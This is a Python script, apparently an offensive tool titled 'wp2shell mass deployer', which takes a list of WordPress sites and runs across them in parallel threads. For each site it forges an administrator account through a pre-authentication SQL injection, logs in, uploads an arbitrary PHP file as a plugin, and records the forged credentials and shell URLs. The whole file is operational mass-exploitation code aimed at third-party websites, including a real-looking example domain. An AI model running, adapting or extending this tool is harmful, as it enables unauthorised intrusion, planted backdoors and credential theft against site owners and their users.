#!/usr/bin/env python3
"""wp2shell mass deployer — upload PHP shell to already-confirmed vulnerable targets.

Reads a file with lines like:
  https://kambis.co.th [wp2shell] sqli=timing proof=kambiscot1_wp ver=7.0

For each target:
  1. Pre-auth admin forge (SQLi → create admin)
  2. Login with forged admin
  3. Upload custom PHP as plugin

Usage:
  python wp2shell_deploy.py -l vuln_targets.txt -p shell.php
  python wp2shell_deploy.py -l vuln_targets.txt -p shell.php -n myshell
  python wp2shell_deploy.py -l vuln_targets.txt -p shell.php -t 20 -D
"""
from __future__ import print_function

import argparse
import os
import re
import sys
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

import zephr_wp2shell as z

try:
    from wp2shell.shell import AdminSession
except ImportError:
    AdminSession = None

try:
    from termcolor import colored
except ImportError:
    def colored(text, _color=None):
        return text

if sys.platform == 'win32':
    try:
        import colorama
        colorama.just_fix_windows_console()
    except ImportError:
        pass

OUTPUT_DIR = os.path.join(BASE_DIR, 'vuln_wp2shell')
DEPLOY_FILE = os.path.join(OUTPUT_DIR, 'wp2shell_deploy.txt')
FAIL_FILE = os.path.join(OUTPUT_DIR, 'wp2shell_deploy_fail.txt')

_write_lock = threading.RLock()
_print_lock = threading.RLock()
_stats_lock = threading.Lock()
_stats = {'done': 0, 'ok': 0, 'fail': 0, 'total': 0}

BANNER = r"""
  _____          _         ____
 |__  /___ _ __ | |__  _ _/ ___|  ___  ___
   / // _ \ '_ \| '_ \| '__\___ \ / _ \/ __|
  / /|  __/ |_) | | | | |   ___) |  __/ (__
 /____\___| .__/|_| |_|_|  |____/ \___|\___|
          |_|       wp2shell deploy  -  ZephrSec
"""


def _ensure_dirs():
    os.makedirs(OUTPUT_DIR, exist_ok=True)


def _append(path, line):
    _ensure_dirs()
    with _write_lock:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(line.rstrip() + '\n')


def _log(msg, color=None):
    with _print_lock:
        print(colored(msg, color) if color else msg, flush=True)


def _strip_scheme(url):
    url = (url or '').strip()
    if url.startswith('https://'):
        return url[8:]
    if url.startswith('http://'):
        return url[7:]
    return url


def detect_scheme(url, timeout=8, force_probe=False):
    raw = (url or '').strip()
    if not raw:
        return ''
    host = _strip_scheme(raw).rstrip('/')

    if force_probe:
        for scheme in ('https://', 'http://'):
            try:
                st, _ = z.http(scheme + host + '/')
                if st is not None:
                    return scheme + host
            except Exception:
                pass
        return 'https://' + host

    if raw.startswith(('http://', 'https://')):
        try:
            st, _ = z.http(raw + '/')
            if st is not None:
                return raw.rstrip('/')
        except Exception:
            pass
        alt = ('https://' if raw.startswith('http://') else 'http://') + host
        try:
            st, _ = z.http(alt + '/')
            if st is not None:
                return alt.rstrip('/')
        except Exception:
            pass
        return raw.rstrip('/')

    for scheme in ('https://', 'http://'):
        try:
            st, _ = z.http(scheme + host + '/')
            if st is not None:
                return scheme + host
        except Exception:
            pass
    return 'https://' + host


def ensure_scheme(url):
    url = (url or '').strip()
    if not url:
        return ''
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    return url.rstrip('/')


def parse_target_line(line):
    """Parse a confirmed vuln line and return the URL.

    Formats accepted:
      https://kambis.co.th [wp2shell] sqli=timing proof=kambiscot1_wp ver=7.0
      https://kambis.co.th
      http://kambis.co.th
    """
    line = line.strip()
    if not line:
        return None
    # Extract URL: everything before the first space or the whole line
    m = re.match(r'(https?://[^\s]+)', line)
    if m:
        return m.group(1).rstrip('/')
    # No scheme — treat as domain
    parts = line.split()
    if parts:
        return ensure_scheme(parts[0])
    return None


def load_targets(path):
    """Load target list, deduplicate, return list of URLs."""
    seen = set()
    urls = []
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            url = parse_target_line(line)
            if not url:
                continue
            key = url.lower().rstrip('/')
            if key in seen:
                continue
            seen.add(key)
            urls.append(url)
    return urls


def _progress_tick(url, success, reason=''):
    with _stats_lock:
        _stats['done'] += 1
        if success:
            _stats['ok'] += 1
        else:
            _stats['fail'] += 1
        done = _stats['done']
        total = _stats['total']
        ok = _stats['ok']
        fail = _stats['fail']
    tag = colored('OK', 'green') if success else colored('FAIL', 'red')
    extra = ' (%s)' % reason if reason else ''
    _log('[%d/%d] %s -> %s%s' % (done, total, url, tag, extra))
    if done == total or done % 50 == 0:
        _log('[*] Progress: %d/%d | ok: %d | fail: %d' % (done, total, ok, fail), 'cyan')


def deploy_one(url, php_path, plugin_name, timeout, auto_detect, verbose):
    """Forge admin → login → upload PHP for a single target. Returns (success, reason)."""
    z.TIMEOUT = int(timeout)
    z.DEFAULT_TIMEOUT = int(timeout)

    # 1. Detect scheme
    if auto_detect:
        url = detect_scheme(url, timeout=8, force_probe=True)
    else:
        url = ensure_scheme(url)

    _v = lambda msg: _log(msg, 'cyan') if verbose else None

    # 2. Pre-auth admin forge
    _v('[*] forging admin ...')
    try:
        eng = z.PreAuthRCE(url, timeout=max(float(timeout), 120.0), sleep=4.0, route='auto')
        user, pw, run, cleanup = eng.deploy()
    except Exception as e:
        return False, 'forge failed: %s' % e

    _v('[+] forged admin: %s:%s' % (user, pw))

    # 3. Login + upload PHP
    if AdminSession is None:
        return False, 'AdminSession not available'

    _v('[*] logging in + uploading PHP ...')
    try:
        sess = AdminSession(url, timeout=max(float(timeout), 60.0))
        if not sess.login(user, pw):
            return False, 'login failed'
        php_path_result = sess.deploy_custom_php(php_path, plugin_name=plugin_name)
        php_url = url.rstrip('/') + php_path_result
    except Exception as e:
        return False, 'upload failed: %s' % e

    # 4. Log success
    _log('[+] DEPLOYED %s | %s | user=%s pass=%s' % (url, php_url, user, pw), 'green')
    _append(DEPLOY_FILE, '%s user=%s pass=%s url=%s' % (url, user, pw, php_url))

    # 5. Cleanup webshell (keep custom PHP)
    try:
        cleanup()
    except Exception:
        pass

    return True, php_url


def process_target(url, php_path, plugin_name, timeout, auto_detect, verbose):
    try:
        ok, reason = deploy_one(url, php_path, plugin_name, timeout, auto_detect, verbose)
    except Exception as e:
        ok = False
        reason = str(e)
        if verbose:
            _log('[-] error: %s' % e, 'red')
    _progress_tick(url, ok, reason)
    if not ok:
        _append(FAIL_FILE, '%s reason=%s' % (url, reason))


def main():
    _log(BANNER, 'cyan')

    ap = argparse.ArgumentParser(description='wp2shell mass deployer — upload PHP to confirmed vuln targets')
    ap.add_argument('-l', '--list', dest='list_file', required=True,
                    help='Target list file (confirmed vuln lines or plain URLs)')
    ap.add_argument('-p', '--php', dest='php_file', required=True,
                    help='PHP file to upload as plugin')
    ap.add_argument('-n', '--name', dest='plugin_name', default=None,
                    help='Custom plugin slug (default: random wp2custom_<hex>)')
    ap.add_argument('-t', '--threads', type=int, default=10,
                    help='Thread workers (default 10)')
    ap.add_argument('--timeout', type=float, default=120.0,
                    help='HTTP timeout seconds (default 120)')
    ap.add_argument('-D', '--auto-detect', action='store_true',
                    help='Auto-detect HTTP/HTTPS for each target')
    ap.add_argument('-v', '--verbose', action='store_true',
                    help='Verbose per-target logs')
    args = ap.parse_args()

    if not os.path.isfile(args.list_file):
        _log('[-] List file not found: %s' % args.list_file, 'red')
        return 1
    if not os.path.isfile(args.php_file):
        _log('[-] PHP file not found: %s' % args.php_file, 'red')
        return 1

    _ensure_dirs()
    urls = load_targets(args.list_file)
    if not urls:
        _log('[-] No targets found in %s' % args.list_file, 'red')
        return 1

    with _stats_lock:
        _stats['done'] = 0
        _stats['ok'] = 0
        _stats['fail'] = 0
        _stats['total'] = len(urls)

    _log('[*] Targets: %d | Threads: %d | PHP: %s' % (len(urls), args.threads, args.php_file), 'cyan')
    if args.plugin_name:
        _log('[*] Plugin name: %s' % args.plugin_name, 'cyan')
    _log('[*] Output: %s' % OUTPUT_DIR, 'cyan')
    _log('─' * 60, 'cyan')

    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = [
            pool.submit(
                process_target, u, args.php_file, args.plugin_name,
                args.timeout, args.auto_detect, args.verbose,
            )
            for u in urls
        ]
        for fut in as_completed(futures):
            try:
                fut.result()
            except Exception:
                pass

    with _stats_lock:
        done, ok, fail = _stats['done'], _stats['ok'], _stats['fail']

    _log('─' * 60, 'cyan')
    _log('[*] Done. %d targets | %s | %s' % (
        done,
        colored('%d deployed' % ok, 'green'),
        colored('%d failed' % fail, 'red'),
    ), 'cyan')
    _log('[*] Results: %s' % DEPLOY_FILE, 'cyan')
    if fail:
        _log('[*] Failures: %s' % FAIL_FILE, 'yellow')
    return 0


if __name__ == '__main__':
    try:
        sys.exit(main() or 0)
    except KeyboardInterrupt:
        print(colored('\n[!] Interrupted.', 'yellow'))
        sys.exit(130)
